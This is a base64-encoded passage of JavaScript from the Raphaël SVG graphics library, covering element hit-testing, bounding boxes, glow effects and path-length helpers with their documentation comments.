ICAgICAgICBjbGllbnRUb3AgPSBkb2NFbGVtLmNsaWVudFRvcCB8fCBib2R5LmNsaWVudFRvcCB8fCAwLCBjbGllbnRMZWZ0ID0gZG9jRWxlbS5jbGllbnRMZWZ0IHx8IGJvZHkuY2xpZW50TGVmdCB8fCAwLFxuICAgICAgICAgICAgdG9wICA9IGJveC50b3AgICsgKGcud2luLnBhZ2VZT2Zmc2V0IHx8IGRvY0VsZW0uc2Nyb2xsVG9wIHx8IGJvZHkuc2Nyb2xsVG9wICkgLSBjbGllbnRUb3AsXG4gICAgICAgICAgICBsZWZ0ID0gYm94LmxlZnQgKyAoZy53aW4ucGFnZVhPZmZzZXQgfHwgZG9jRWxlbS5zY3JvbGxMZWZ0IHx8IGJvZHkuc2Nyb2xsTGVmdCkgLSBjbGllbnRMZWZ0O1xuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgeTogdG9wLFxuICAgICAgICAgICAgeDogbGVmdFxuICAgICAgICB9O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLmdldEVsZW1lbnRCeVBvaW50XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIHlvdSB0b3Btb3N0IGVsZW1lbnQgdW5kZXIgZ2l2ZW4gcG9pbnQuXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgUmFwaGHDq2wgZWxlbWVudCBvYmplY3RcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0geCAobnVtYmVyKSB4IGNvb3JkaW5hdGUgZnJvbSB0aGUgdG9wIGxlZnQgY29ybmVyIG9mIHRoZSB3aW5kb3dcbiAgICAgLSB5IChudW1iZXIpIHkgY29vcmRpbmF0ZSBmcm9tIHRoZSB0b3AgbGVmdCBjb3JuZXIgb2YgdGhlIHdpbmRvd1xuICAgICA+IFVzYWdlXG4gICAgIHwgcGFwZXIuZ2V0RWxlbWVudEJ5UG9pbnQobW91c2VYLCBtb3VzZVkpLmF0dHIoe3N0cm9rZTogXCIjZjAwXCJ9KTtcbiAgICBcXCovXG4gICAgcGFwZXJwcm90by5nZXRFbGVtZW50QnlQb2ludCA9IGZ1bmN0aW9uICh4LCB5KSB7XG4gICAgICAgIHZhciBwYXBlciA9IHRoaXMsXG4gICAgICAgICAgICBzdmcgPSBwYXBlci5jYW52YXMsXG4gICAgICAgICAgICB0YXJnZXQgPSBnLmRvYy5lbGVtZW50RnJvbVBvaW50KHgsIHkpO1xuICAgICAgICBpZiAoZy53aW4ub3BlcmEgJiYgdGFyZ2V0LnRhZ05hbWUgPT0gXCJzdmdcIikge1xuICAgICAgICAgICAgdmFyIHNvID0gZ2V0T2Zmc2V0KHN2ZyksXG4gICAgICAgICAgICAgICAgc3IgPSBzdmcuY3JlYXRlU1ZHUmVjdCgpO1xuICAgICAgICAgICAgc3IueCA9IHggLSBzby54O1xuICAgICAgICAgICAgc3IueSA9IHkgLSBzby55O1xuICAgICAgICAgICAgc3Iud2lkdGggPSBzci5oZWlnaHQgPSAxO1xuICAgICAgICAgICAgdmFyIGhpdHMgPSBzdmcuZ2V0SW50ZXJzZWN0aW9uTGlzdChzciwgbnVsbCk7XG4gICAgICAgICAgICBpZiAoaGl0cy5sZW5ndGgpIHtcbiAgICAgICAgICAgICAgICB0YXJnZXQgPSBoaXRzW2hpdHMubGVuZ3RoIC0gMV07XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCF0YXJnZXQpIHtcbiAgICAgICAgICAgIHJldHVybiBudWxsO1xuICAgICAgICB9XG4gICAgICAgIHdoaWxlICh0YXJnZXQucGFyZW50Tm9kZSAmJiB0YXJnZXQgIT0gc3ZnLnBhcmVudE5vZGUgJiYgIXRhcmdldC5yYXBoYWVsKSB7XG4gICAgICAgICAgICB0YXJnZXQgPSB0YXJnZXQucGFyZW50Tm9kZTtcbiAgICAgICAgfVxuICAgICAgICB0YXJnZXQgPT0gcGFwZXIuY2FudmFzLnBhcmVudE5vZGUgJiYgKHRhcmdldCA9IHN2Zyk7XG4gICAgICAgIHRhcmdldCA9IHRhcmdldCAmJiB0YXJnZXQucmFwaGFlbCA/IHBhcGVyLmdldEJ5SWQodGFyZ2V0LnJhcGhhZWxpZCkgOiBudWxsO1xuICAgICAgICByZXR1cm4gdGFyZ2V0O1xuICAgIH07XG5cbiAgICAvKlxcXG4gICAgICogUGFwZXIuZ2V0RWxlbWVudHNCeUJCb3hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHVybnMgc2V0IG9mIGVsZW1lbnRzIHRoYXQgaGF2ZSBhbiBpbnRlcnNlY3RpbmcgYm91bmRpbmcgYm94XG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGJib3ggKG9iamVjdCkgYmJveCB0byBjaGVjayB3aXRoXG4gICAgID0gKG9iamVjdCkgQFNldFxuICAgICBcXCovXG4gICAgcGFwZXJwcm90by5nZXRFbGVtZW50c0J5QkJveCA9IGZ1bmN0aW9uIChiYm94KSB7XG4gICAgICAgIHZhciBzZXQgPSB0aGlzLnNldCgpO1xuICAgICAgICB0aGlzLmZvckVhY2goZnVuY3Rpb24gKGVsKSB7XG4gICAgICAgICAgICBpZiAoUi5pc0JCb3hJbnRlcnNlY3QoZWwuZ2V0QkJveCgpLCBiYm94KSkge1xuICAgICAgICAgICAgICAgIHNldC5wdXNoKGVsKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSk7XG4gICAgICAgIHJldHVybiBzZXQ7XG4gICAgfTtcblxuICAgIC8qXFxcbiAgICAgKiBQYXBlci5nZXRCeUlkXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIHlvdSBlbGVtZW50IGJ5IGl0cyBpbnRlcm5hbCBJRC5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gaWQgKG51bWJlcikgaWRcbiAgICAgPSAob2JqZWN0KSBSYXBoYcOrbCBlbGVtZW50IG9iamVjdFxuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLmdldEJ5SWQgPSBmdW5jdGlvbiAoaWQpIHtcbiAgICAgICAgdmFyIGJvdCA9IHRoaXMuYm90dG9tO1xuICAgICAgICB3aGlsZSAoYm90KSB7XG4gICAgICAgICAgICBpZiAoYm90LmlkID09IGlkKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIGJvdDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGJvdCA9IGJvdC5uZXh0O1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBudWxsO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLmZvckVhY2hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEV4ZWN1dGVzIGdpdmVuIGZ1bmN0aW9uIGZvciBlYWNoIGVsZW1lbnQgb24gdGhlIHBhcGVyXG4gICAgICpcbiAgICAgKiBJZiBjYWxsYmFjayBmdW5jdGlvbiByZXR1cm5zIGBmYWxzZWAgaXQgd2lsbCBzdG9wIGxvb3AgcnVubmluZy5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gY2FsbGJhY2sgKGZ1bmN0aW9uKSBmdW5jdGlvbiB0byBydW5cbiAgICAgLSB0aGlzQXJnIChvYmplY3QpIGNvbnRleHQgb2JqZWN0IGZvciB0aGUgY2FsbGJhY2tcbiAgICAgPSAob2JqZWN0KSBQYXBlciBvYmplY3RcbiAgICAgPiBVc2FnZVxuICAgICB8IHBhcGVyLmZvckVhY2goZnVuY3Rpb24gKGVsKSB7XG4gICAgIHwgICAgIGVsLmF0dHIoeyBzdHJva2U6IFwiYmx1ZVwiIH0pO1xuICAgICB8IH0pO1xuICAgIFxcKi9cbiAgICBwYXBlcnByb3RvLmZvckVhY2ggPSBmdW5jdGlvbiAoY2FsbGJhY2ssIHRoaXNBcmcpIHtcbiAgICAgICAgdmFyIGJvdCA9IHRoaXMuYm90dG9tO1xuICAgICAgICB3aGlsZSAoYm90KSB7XG4gICAgICAgICAgICBpZiAoY2FsbGJhY2suY2FsbCh0aGlzQXJnLCBib3QpID09PSBmYWxzZSkge1xuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgYm90ID0gYm90Lm5leHQ7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUGFwZXIuZ2V0RWxlbWVudHNCeVBvaW50XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIHNldCBvZiBlbGVtZW50cyB0aGF0IGhhdmUgY29tbW9uIHBvaW50IGluc2lkZVxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSB4IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgcG9pbnRcbiAgICAgLSB5IChudW1iZXIpIHkgY29vcmRpbmF0ZSBvZiB0aGUgcG9pbnRcbiAgICAgPSAob2JqZWN0KSBAU2V0XG4gICAgXFwqL1xuICAgIHBhcGVycHJvdG8uZ2V0RWxlbWVudHNCeVBvaW50ID0gZnVuY3Rpb24gKHgsIHkpIHtcbiAgICAgICAgdmFyIHNldCA9IHRoaXMuc2V0KCk7XG4gICAgICAgIHRoaXMuZm9yRWFjaChmdW5jdGlvbiAoZWwpIHtcbiAgICAgICAgICAgIGlmIChlbC5pc1BvaW50SW5zaWRlKHgsIHkpKSB7XG4gICAgICAgICAgICAgICAgc2V0LnB1c2goZWwpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICAgICAgcmV0dXJuIHNldDtcbiAgICB9O1xuICAgIGZ1bmN0aW9uIHhfeSgpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMueCArIFMgKyB0aGlzLnk7XG4gICAgfVxuICAgIGZ1bmN0aW9uIHhfeV93X2goKSB7XG4gICAgICAgIHJldHVybiB0aGlzLnggKyBTICsgdGhpcy55ICsgUyArIHRoaXMud2lkdGggKyBcIiBcXHhkNyBcIiArIHRoaXMuaGVpZ2h0O1xuICAgIH1cbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5pc1BvaW50SW5zaWRlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBEZXRlcm1pbmUgaWYgZ2l2ZW4gcG9pbnQgaXMgaW5zaWRlIHRoaXMgZWxlbWVudOKAmXMgc2hhcGVcbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0geCAobnVtYmVyKSB4IGNvb3JkaW5hdGUgb2YgdGhlIHBvaW50XG4gICAgIC0geSAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIHBvaW50XG4gICAgID0gKGJvb2xlYW4pIGB0cnVlYCBpZiBwb2ludCBpbnNpZGUgdGhlIHNoYXBlXG4gICAgXFwqL1xuICAgIGVscHJvdG8uaXNQb2ludEluc2lkZSA9IGZ1bmN0aW9uICh4LCB5KSB7XG4gICAgICAgIHZhciBycCA9IHRoaXMucmVhbFBhdGggPSBnZXRQYXRoW3RoaXMudHlwZV0odGhpcyk7XG4gICAgICAgIGlmICh0aGlzLmF0dHIoJ3RyYW5zZm9ybScpICYmIHRoaXMuYXR0cigndHJhbnNmb3JtJykubGVuZ3RoKSB7XG4gICAgICAgICAgICBycCA9IFIudHJhbnNmb3JtUGF0aChycCwgdGhpcy5hdHRyKCd0cmFuc2Zvcm0nKSk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIFIuaXNQb2ludEluc2lkZVBhdGgocnAsIHgsIHkpO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuZ2V0QkJveFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmV0dXJuIGJvdW5kaW5nIGJveCBmb3IgYSBnaXZlbiBlbGVtZW50XG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGlzV2l0aG91dFRyYW5zZm9ybSAoYm9vbGVhbikgZmxhZywgYHRydWVgIGlmIHlvdSB3YW50IHRvIGhhdmUgYm91bmRpbmcgYm94IGJlZm9yZSB0cmFuc2Zvcm1hdGlvbnMuIERlZmF1bHQgaXMgYGZhbHNlYC5cbiAgICAgPSAob2JqZWN0KSBCb3VuZGluZyBib3ggb2JqZWN0OlxuICAgICBvIHtcbiAgICAgbyAgICAgeDogKG51bWJlcikgdG9wIGxlZnQgY29ybmVyIHhcbiAgICAgbyAgICAgeTogKG51bWJlcikgdG9wIGxlZnQgY29ybmVyIHlcbiAgICAgbyAgICAgeDI6IChudW1iZXIpIGJvdHRvbSByaWdodCBjb3JuZXIgeFxuICAgICBvICAgICB5MjogKG51bWJlcikgYm90dG9tIHJpZ2h0IGNvcm5lciB5XG4gICAgIG8gICAgIHdpZHRoOiAobnVtYmVyKSB3aWR0aFxuICAgICBvICAgICBoZWlnaHQ6IChudW1iZXIpIGhlaWdodFxuICAgICBvIH1cbiAgICBcXCovXG4gICAgZWxwcm90by5nZXRCQm94ID0gZnVuY3Rpb24gKGlzV2l0aG91dFRyYW5zZm9ybSkge1xuICAgICAgICBpZiAodGhpcy5yZW1vdmVkKSB7XG4gICAgICAgICAgICByZXR1cm4ge307XG4gICAgICAgIH1cbiAgICAgICAgdmFyIF8gPSB0aGlzLl87XG4gICAgICAgIGlmIChpc1dpdGhvdXRUcmFuc2Zvcm0pIHtcbiAgICAgICAgICAgIGlmIChfLmRpcnR5IHx8ICFfLmJib3h3dCkge1xuICAgICAgICAgICAgICAgIHRoaXMucmVhbFBhdGggPSBnZXRQYXRoW3RoaXMudHlwZV0odGhpcyk7XG4gICAgICAgICAgICAgICAgXy5iYm94d3QgPSBwYXRoRGltZW5zaW9ucyh0aGlzLnJlYWxQYXRoKTtcbiAgICAgICAgICAgICAgICBfLmJib3h3dC50b1N0cmluZyA9IHhfeV93X2g7XG4gICAgICAgICAgICAgICAgXy5kaXJ0eSA9IDA7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gXy5iYm94d3Q7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKF8uZGlydHkgfHwgXy5kaXJ0eVQgfHwgIV8uYmJveCkge1xuICAgICAgICAgICAgaWYgKF8uZGlydHkgfHwgIXRoaXMucmVhbFBhdGgpIHtcbiAgICAgICAgICAgICAgICBfLmJib3h3dCA9IDA7XG4gICAgICAgICAgICAgICAgdGhpcy5yZWFsUGF0aCA9IGdldFBhdGhbdGhpcy50eXBlXSh0aGlzKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF8uYmJveCA9IHBhdGhEaW1lbnNpb25zKG1hcFBhdGgodGhpcy5yZWFsUGF0aCwgdGhpcy5tYXRyaXgpKTtcbiAgICAgICAgICAgIF8uYmJveC50b1N0cmluZyA9IHhfeV93X2g7XG4gICAgICAgICAgICBfLmRpcnR5ID0gXy5kaXJ0eVQgPSAwO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBfLmJib3g7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5jbG9uZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgY2xvbmUgb2YgYSBnaXZlbiBlbGVtZW50XG4gICAgICoqXG4gICAgXFwqL1xuICAgIGVscHJvdG8uY2xvbmUgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiBudWxsO1xuICAgICAgICB9XG4gICAgICAgIHZhciBvdXQgPSB0aGlzLnBhcGVyW3RoaXMudHlwZV0oKS5hdHRyKHRoaXMuYXR0cigpKTtcbiAgICAgICAgdGhpcy5fX3NldF9fICYmIHRoaXMuX19zZXRfXy5wdXNoKG91dCk7XG4gICAgICAgIHJldHVybiBvdXQ7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5nbG93XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm4gc2V0IG9mIGVsZW1lbnRzIHRoYXQgY3JlYXRlIGdsb3ctbGlrZSBlZmZlY3QgYXJvdW5kIGdpdmVuIGVsZW1lbnQuIFNlZSBAUGFwZXIuc2V0LlxuICAgICAqXG4gICAgICogTm90ZTogR2xvdyBpcyBub3QgY29ubmVjdGVkIHRvIHRoZSBlbGVtZW50LiBJZiB5b3UgY2hhbmdlIGVsZW1lbnQgYXR0cmlidXRlcyBpdCB3b27igJl0IGFkanVzdCBpdHNlbGYuXG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGdsb3cgKG9iamVjdCkgI29wdGlvbmFsIHBhcmFtZXRlcnMgb2JqZWN0IHdpdGggYWxsIHByb3BlcnRpZXMgb3B0aW9uYWw6XG4gICAgIG8ge1xuICAgICBvICAgICB3aWR0aCAobnVtYmVyKSBzaXplIG9mIHRoZSBnbG93LCBkZWZhdWx0IGlzIGAxMGBcbiAgICAgbyAgICAgZmlsbCAoYm9vbGVhbikgd2lsbCBpdCBiZSBmaWxsZWQsIGRlZmF1bHQgaXMgYGZhbHNlYFxuICAgICBvICAgICBvcGFjaXR5IChudW1iZXIpIG9wYWNpdHksIGRlZmF1bHQgaXMgYDAuNWBcbiAgICAgbyAgICAgb2Zmc2V0eCAobnVtYmVyKSBob3Jpem9udGFsIG9mZnNldCwgZGVmYXVsdCBpcyBgMGBcbiAgICAgbyAgICAgb2Zmc2V0eSAobnVtYmVyKSB2ZXJ0aWNhbCBvZmZzZXQsIGRlZmF1bHQgaXMgYDBgXG4gICAgIG8gICAgIGNvbG9yIChzdHJpbmcpIGdsb3cgY29sb3VyLCBkZWZhdWx0IGlzIGBibGFja2BcbiAgICAgbyB9XG4gICAgID0gKG9iamVjdCkgQFBhcGVyLnNldCBvZiBlbGVtZW50cyB0aGF0IHJlcHJlc2VudHMgZ2xvd1xuICAgIFxcKi9cbiAgICBlbHByb3RvLmdsb3cgPSBmdW5jdGlvbiAoZ2xvdykge1xuICAgICAgICBpZiAodGhpcy50eXBlID09IFwidGV4dFwiKSB7XG4gICAgICAgICAgICByZXR1cm4gbnVsbDtcbiAgICAgICAgfVxuICAgICAgICBnbG93ID0gZ2xvdyB8fCB7fTtcbiAgICAgICAgdmFyIHMgPSB7XG4gICAgICAgICAgICB3aWR0aDogKGdsb3cud2lkdGggfHwgMTApICsgKCt0aGlzLmF0dHIoXCJzdHJva2Utd2lkdGhcIikgfHwgMSksXG4gICAgICAgICAgICBmaWxsOiBnbG93LmZpbGwgfHwgZmFsc2UsXG4gICAgICAgICAgICBvcGFjaXR5OiBnbG93Lm9wYWNpdHkgPT0gbnVsbCA/IC41IDogZ2xvdy5vcGFjaXR5LFxuICAgICAgICAgICAgb2Zmc2V0eDogZ2xvdy5vZmZzZXR4IHx8IDAsXG4gICAgICAgICAgICBvZmZzZXR5OiBnbG93Lm9mZnNldHkgfHwgMCxcbiAgICAgICAgICAgIGNvbG9yOiBnbG93LmNvbG9yIHx8IFwiIzAwMFwiXG4gICAgICAgIH0sXG4gICAgICAgICAgICBjID0gcy53aWR0aCAvIDIsXG4gICAgICAgICAgICByID0gdGhpcy5wYXBlcixcbiAgICAgICAgICAgIG91dCA9IHIuc2V0KCksXG4gICAgICAgICAgICBwYXRoID0gdGhpcy5yZWFsUGF0aCB8fCBnZXRQYXRoW3RoaXMudHlwZV0odGhpcyk7XG4gICAgICAgIHBhdGggPSB0aGlzLm1hdHJpeCA/IG1hcFBhdGgocGF0aCwgdGhpcy5tYXRyaXgpIDogcGF0aDtcbiAgICAgICAgZm9yICh2YXIgaSA9IDE7IGkgPCBjICsgMTsgaSsrKSB7XG4gICAgICAgICAgICBvdXQucHVzaChyLnBhdGgocGF0aCkuYXR0cih7XG4gICAgICAgICAgICAgICAgc3Ryb2tlOiBzLmNvbG9yLFxuICAgICAgICAgICAgICAgIGZpbGw6IHMuZmlsbCA/IHMuY29sb3IgOiBcIm5vbmVcIixcbiAgICAgICAgICAgICAgICBcInN0cm9rZS1saW5lam9pblwiOiBcInJvdW5kXCIsXG4gICAgICAgICAgICAgICAgXCJzdHJva2UtbGluZWNhcFwiOiBcInJvdW5kXCIsXG4gICAgICAgICAgICAgICAgXCJzdHJva2Utd2lkdGhcIjogKyhzLndpZHRoIC8gYyAqIGkpLnRvRml4ZWQoMyksXG4gICAgICAgICAgICAgICAgb3BhY2l0eTogKyhzLm9wYWNpdHkgLyBjKS50b0ZpeGVkKDMpXG4gICAgICAgICAgICB9KSk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIG91dC5pbnNlcnRCZWZvcmUodGhpcykudHJhbnNsYXRlKHMub2Zmc2V0eCwgcy5vZmZzZXR5KTtcbiAgICB9O1xuICAgIHZhciBjdXJ2ZXNsZW5ndGhzID0ge30sXG4gICAgZ2V0UG9pbnRBdFNlZ21lbnRMZW5ndGggPSBmdW5jdGlvbiAocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnksIGxlbmd0aCkge1xuICAgICAgICBpZiAobGVuZ3RoID09IG51bGwpIHtcbiAgICAgICAgICAgIHJldHVybiBiZXpsZW4ocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIFIuZmluZERvdHNBdFNlZ21lbnQocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnksIGdldFRhdExlbihwMXgsIHAxeSwgYzF4LCBjMXksIGMyeCwgYzJ5LCBwMngsIHAyeSwgbGVuZ3RoKSk7XG4gICAgICAgIH1cbiAgICB9LFxuICAgIGdldExlbmd0aEZhY3RvcnkgPSBmdW5jdGlvbiAoaXN0b3RhbCwgc3VicGF0aCkge1xuICAgICAgICByZXR1cm4gZnVuY3Rpb24gKHBhdGgsIGxlbmd0aCwgb25seXN0YXJ0KSB7XG4gICAgICAgICAgICBwYXRoID0gcGF0aDJjdXJ2ZShwYXRoKTtcbiAgICAgICAgICAgIHZhciB4LCB5LCBwLCBsLCBzcCA9IFwiXCIsIHN1YnBhdGhzID0ge30sIHBvaW50LFxuICAgICAgICAgICAgICAgIGxlbiA9IDA7XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBwYXRoLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICBwID0gcGF0aFtpXTtcbiAgICAgICAgICAgICAgICBpZiAocFswXSA9PSBcIk1cIikge1xuICAgICAgICAgICAgICAgICAgICB4ID0gK3BbMV07XG4gICAgICAgICAgICAgICAgICAgIHkgPSArcFsyXTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBsID0gZ2V0UG9pbnRBdFNlZ21lbnRMZW5ndGgoeCwgeSwgcFsxXSwgcFsyXSwgcFszXSwgcFs0XSwgcFs1XSwgcFs2XSk7XG4gICAgICAgICAgICAgICAgICAgIGlmIChsZW4gKyBsID4gbGVuZ3RoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3VicGF0aCAmJiAhc3VicGF0aHMuc3RhcnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb2ludCA9IGdldFBvaW50QXRTZWdtZW50TGVuZ3RoKHgsIHksIHBbMV0sIHBbMl0sIHBbM10sIHBbNF0sIHBbNV0sIHBbNl0sIGxlbmd0aCAtIGxlbik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3AgKz0gW1wiQ1wiICsgcG9pbnQuc3RhcnQueCwgcG9pbnQuc3RhcnQueSwgcG9pbnQubS54LCBwb2ludC5tLnksIHBvaW50LngsIHBvaW50LnldO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChvbmx5c3RhcnQpIHtyZXR1cm4gc3A7fVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YnBhdGhzLnN0YXJ0ID0gc3A7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3AgPSBbXCJNXCIgKyBwb2ludC54LCBwb2ludC55ICsgXCJDXCIgKyBwb2ludC5uLngsIHBvaW50Lm4ueSwgcG9pbnQuZW5kLngsIHBvaW50LmVuZC55LCBwWzVdLCBwWzZdXS5qb2luKCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuICs9IGw7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgeCA9ICtwWzVdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkgPSArcFs2XTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghaXN0b3RhbCAmJiAhc3VicGF0aCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvaW50ID0gZ2V0UG9pbnRBdFNlZ21lbnRMZW5ndGgoeCwgeSwgcFsxXSwgcFsyXSwgcFszXSwgcFs0XSwgcFs1XSwgcFs2XSwgbGVuZ3RoIC0gbGVuKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4ge3g6IHBvaW50LngsIHk6IHBvaW50LnksIGFscGhhOiBwb2ludC5hbHBoYX07XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgbGVuICs9IGw7XG4gICAgICAgICAgICAgICAgICAgIHggPSArcFs1XTtcbiAgICAgICAgICAgICAgICAgICAgeSA9ICtwWzZdO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBzcCArPSBwLnNoaWZ0KCkgKyBwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgc3VicGF0aHMuZW5kID0gc3A7XG4gICAgICAgICAgICBwb2ludCA9IGlzdG90YWwgPyBsZW4gOiBzdWJwYXRoID8gc3VicGF0aHMgOiBSLmZpbmREb3RzQXRTZWdtZW50KHgsIHksIHBbMF0sIHBbMV0sIHBbMl0sIHBbM10sIHBbNF0sIHBbNV0sIDEpO1xuICAgICAgICAgICAgcG9pbnQuYWxwaGEgJiYgKHBvaW50ID0ge3g6IHBvaW50LngsIHk6IHBvaW50LnksIGFscGhhOiBwb2ludC5hbHBoYX0pO1xuICAgICAgICAgICAgcmV0dXJuIHBvaW50O1xuICAgICAgICB9O1xuICAgIH07XG4gICAgdmFyIGdldFRvdGFsTGVuZ3RoID0gZ2V0TGVuZ3RoRmFjdG9yeSgxKSxcbiAgICAgICAgZ2V0UG9pbnRBdExlbmd0aCA9IGdldExlbmd0aEZhY3RvcnkoKSxcbiAgICAgICAgZ2V0U3VicGF0aHNBdExlbmd0aCA9IGdldExlbmd0aEZhY3RvcnkoMCwgMSk7XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuZ2V0VG90YWxMZW5ndGhcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHVybnMgbGVuZ3RoIG9mIHRoZSBnaXZlbiBwYXRoIGluIHBpeGVscy5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gcGF0aCAoc3RyaW5nKSBTVkcgcGF0aCBzdHJpbmcuXG4gICAgICoqXG4gICAgID0gKG51bWJlcikgbGVuZ3RoLlxuICAgIFxcKi9cbiAgICBSLmdldFRvdGFsTGVuZ3RoID0gZ2V0VG90YWxMZW5ndGg7XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuZ2V0UG9pbnRBdExlbmd0aFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmV0dXJuIGNvb3JkaW5hdGVzIG9mIHRoZSBwb2ludCBsb2NhdGVkIGF0IHRoZSBnaXZlbiBsZW5ndGggb24gdGhlIGdpdmVuIHBhdGguXG4gICAgICoqXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIHBhdGggKHN0cmluZykgU1ZHIHBhdGggc3RyaW5nXG4gICAgIC0gbGVuZ3RoIChudW1iZXIpXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgcmVwcmVzZW50YXRpb24gb2YgdGhlIHBvaW50OlxuICAgICBvIHtcbiAgICAgbyAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlXG4gICAgIG8gICAgIHk6IChudW1iZXIpIHkgY29vcmRpbmF0ZVxuICAgICBvICAgICBhbHBoYTogKG51bWJlcikgYW5nbGUgb2YgZGVyaXZhdGl2ZVxuICAgICBvIH1cbiAgICBcXCovXG4gICAgUi5nZXRQb2ludEF0TGVuZ3RoID0gZ2V0UG9pbnRBdExlbmd0aDtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5nZXRTdWJwYXRoXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm4gc3VicGF0aCBvZiBhIGdpdmVuIHBhdGggZnJvbSBnaXZlbiBsZW5ndGggdG8gZ2l2ZW4gbGVuZ3RoLlxuICAgICAqKlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgKipcbiAgICAgLSBwYXRoIChzdHJpbmcpIFNWRyBwYXRoIHN0cmluZ1